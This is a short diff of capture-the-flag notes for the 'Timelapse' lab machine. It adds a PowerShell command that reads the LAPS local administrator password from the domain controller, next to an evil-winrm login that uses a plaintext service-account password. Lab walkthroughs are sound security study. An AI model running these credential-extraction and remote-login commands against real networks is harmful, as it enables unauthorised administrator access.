@@ -102,6 +102,8 @@ exit
 
 evil-winrm -i 10.10.11.152 -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S
 
+https://community.spiceworks.com/topic/2316985-collecting-laps-password-and-expiration-date
+
 Get-ADComputer -Identity "DC01" -Server "timelapse.htb" -properties ms-mcs-admpwd,ms-mcs-admpwdexpirationtime | select-object ms-mcs-admpwd,ms-mcs-admpwdexpirationtime
 
 ms-mcs-admpwd            ms-mcs-admpwdexpirationtime
